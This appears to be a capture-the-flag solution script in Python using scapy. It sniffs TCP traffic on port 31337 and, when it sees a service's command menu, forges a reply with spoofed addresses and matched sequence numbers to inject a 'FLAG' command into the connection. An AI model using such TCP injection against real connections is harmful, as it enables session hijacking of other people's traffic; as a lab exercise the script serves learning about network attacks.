from scapy.all import *

def callback(pkt):
    print(pkt["IP"].src, pkt["IP"].dst, pkt["TCP"].sport, pkt["TCP"].dport, pkt["TCP"].flags, pkt["TCP"].seq,pkt["TCP"].ack,raw(pkt["TCP"].payload)) # printing the packets
    if raw(pkt["TCP"].payload) == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n': # Check the plain text of the incoming packet, for which we need to craft a reply
        newack = len(raw(pkt["TCP"].payload))
        answer = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/TCP(sport=pkt["TCP"].dport, dport=pkt["TCP"].sport,flags="PA",seq=pkt["TCP"].ack,ack=pkt["TCP"].seq+newack)/Raw("FLAG\n") # #edit the Raw Contents to support the necessary content
        send(answer)

print("src, dst, sport, dport, flags,seq,ack,data") 
sniff(filter="port 31337", iface="eth0", prn=callback) # Change the filter and iface accordingly
